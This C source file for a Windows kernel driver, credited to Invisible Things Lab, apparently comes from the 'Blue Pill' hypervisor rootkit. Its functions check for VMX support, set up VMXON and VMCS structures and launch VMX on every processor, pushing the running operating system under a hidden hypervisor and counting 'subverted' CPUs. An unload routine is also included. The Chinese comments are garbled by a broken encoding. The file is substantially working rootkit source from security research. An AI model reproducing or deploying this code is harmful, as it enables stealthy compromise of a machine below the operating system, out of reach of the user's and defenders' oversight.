/* 
 * Copyright holder: Invisible Things Lab
 */

#include "hvm.h"

ULONG g_uSubvertedCPUs;
CPU cpu[32];

NTSTATUS HvmSubvertCpu (
  PVOID GuestRsp
)
{
    PCPU pCpu = &cpu[KeGetCurrentProcessorNumber ()];
    ULONG_PTR VMM_Stack;
    PHYSICAL_ADDRESS PhyAddr;

    KdPrint (("HvmSubvertCpu(): Running on processor #%d\n", KeGetCurrentProcessorNumber ()));

    // ���IA32_FEATURE_CONTROL�Ĵ�����Lockλ
    if (!(__readmsr(MSR_IA32_FEATURE_CONTROL) & FEATURE_CONTROL_LOCKED))
    {
        KdPrint(("VmxInitialize() IA32_FEATURE_CONTROL bit[0] = 0!\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // ���IA32_FEATURE_CONTROL�Ĵ�����Enable VMX outside SMXλ
    if (!(__readmsr(MSR_IA32_FEATURE_CONTROL) & FEATURE_CONTROL_VMXON_ENABLED))
    {
        KdPrint(("VmxInitialize() IA32_FEATURE_CONTROL bit[2] = 0!\n"));
        return STATUS_UNSUCCESSFUL;
    }

    PhyAddr.QuadPart = -1;
    //
    // ΪVMXON�ṹ����ռ� (Allocate VMXON region)
    //
    pCpu->OriginaVmxonR = MmAllocateContiguousMemory(PAGE_SIZE, PhyAddr);
    if (!pCpu->OriginaVmxonR)
    {
        KdPrint (("VmxInitialize(): Failed to allocate memory for original VMXON\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory (pCpu->OriginaVmxonR, PAGE_SIZE);

    //
    // ΪVMCS�ṹ����ռ� (Allocate VMCS)
    //
    pCpu->OriginalVmcs = MmAllocateContiguousMemory(PAGE_SIZE, PhyAddr);
    if (!pCpu->OriginalVmcs)
    {
        KdPrint (("VmxInitialize(): Failed to allocate memory for original VMCS\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory (pCpu->OriginalVmcs, PAGE_SIZE);

    // ΪGuest�����ں�ջ(��ҳ����), ��С��Host��ͬ
    pCpu->VMM_Stack = ExAllocatePoolWithTag (NonPagedPool, 2 * PAGE_SIZE, MEM_TAG);
    if (!pCpu->VMM_Stack)
    {
        KdPrint (("HvmSubvertCpu(): Failed to allocate host stack!\n"));
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory (pCpu->VMM_Stack, 2 * PAGE_SIZE);

  //
  // ׼��VMҪ�õ������ݽṹ (VMXON & VMCS )
  // GuestRip��GuestRsp�ᱻ���VMCS�ṹ������Guestԭ���Ĵ���λ�ú�ջ��ָ��
  //

  set_in_cr4 (X86_CR4_VMXE);
  *(ULONG64 *) pCpu->OriginaVmxonR = (__readmsr(MSR_IA32_VMX_BASIC) & 0xffffffff); //set up vmcs_revision_id
  *(ULONG64 *) pCpu->OriginalVmcs  = (__readmsr(MSR_IA32_VMX_BASIC) & 0xffffffff); 

  PhyAddr = MmGetPhysicalAddress(pCpu->OriginaVmxonR);
  if (__vmx_on (&PhyAddr))
  {
      KdPrint (("VmxOn Failed!\n"));
      return STATUS_UNSUCCESSFUL;
  }

  //============================= ����VMCS ================================
  PhyAddr = MmGetPhysicalAddress(pCpu->OriginalVmcs);
  __vmx_vmclear (&PhyAddr);  // ȡ����ǰ��VMCS�ļ���״̬
  __vmx_vmptrld (&PhyAddr);  // �����µ�VMCS����Ϊ����״̬

  VMM_Stack = (ULONG_PTR)pCpu->VMM_Stack + 2 * PAGE_SIZE - 8;
  if ( VmxSetupVMCS (VMM_Stack, CmGuestEip, GuestRsp) )
  {
      KdPrint (("VmxSetupVMCS() failed!"));
      __vmx_off ();
      clear_in_cr4 (X86_CR4_VMXE);
      return STATUS_UNSUCCESSFUL;
  }

  InterlockedIncrement (&g_uSubvertedCPUs);  // ����Ⱦ��CPU��+=1

  // һ��׼��������ϣ�ʹ��CPU���������
  __vmx_vmlaunch();

  // never reached
  InterlockedDecrement (&g_uSubvertedCPUs);
  return STATUS_SUCCESS;
}

NTSTATUS
HvmSpitOutBluepill ()
{
    KIRQL OldIrql;
    CHAR i;

    // �������д�����
    for (i = 0; i < KeNumberProcessors; i++)
    {
        KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // ������������ָ��CPU
        OldIrql = KeRaiseIrqlToDpcLevel ();

        VmxVmCall (NBP_HYPERCALL_UNLOAD);

        KeLowerIrql (OldIrql);
        KeRevertToUserAffinityThread ();
    }

    return STATUS_SUCCESS;
}

NTSTATUS
HvmSwallowBluepill ()
{
    NTSTATUS Status;
    KIRQL OldIrql;
    CHAR i;

    // �������д�����
    for (i = 0; i < KeNumberProcessors; i++)
    {
        KeSetSystemAffinityThread ((KAFFINITY) ((ULONG_PTR)1 << i));  // ������������ָ��CPU
        OldIrql = KeRaiseIrqlToDpcLevel ();

        Status = CmSubvert (NULL);  // CmSubvert�������Ǳ������мĴ���(���˶μĴ���)�����ݵ�ջ��󣬵���HvmSubvertCpu

        KeLowerIrql (OldIrql);
        KeRevertToUserAffinityThread ();

        if (Status)
        {
            KdPrint (("HvmSwallowBluepill(): CmSubvert() failed with status 0x%08hX\n", Status));
            break;
        }
    }

    if (KeNumberProcessors != g_uSubvertedCPUs)  // ���û�ж�ÿ���˶���Ⱦ�ɹ�����������
    {
        HvmSpitOutBluepill ();
        return STATUS_UNSUCCESSFUL;
    }

    return Status;
}
